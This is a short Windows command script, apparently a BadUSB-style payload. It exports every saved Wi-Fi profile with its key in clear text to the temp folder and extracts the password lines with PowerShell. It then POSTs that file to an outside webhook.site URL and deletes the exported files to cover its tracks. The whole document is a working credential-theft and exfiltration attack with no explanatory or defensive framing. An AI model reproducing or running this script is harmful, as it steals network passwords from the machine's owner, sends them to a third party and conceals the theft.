cmd /k
cd %temp%
netsh wlan export profile key=clear
powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > WiFi-PASS
powershell Invoke-WebRequest -Uri https://webhook.site/86c476c4-b26d-44d0-80e1-ddd4f87e4409 -Method POST -InFile WiFi-PASS
del WiFi* /s /f /q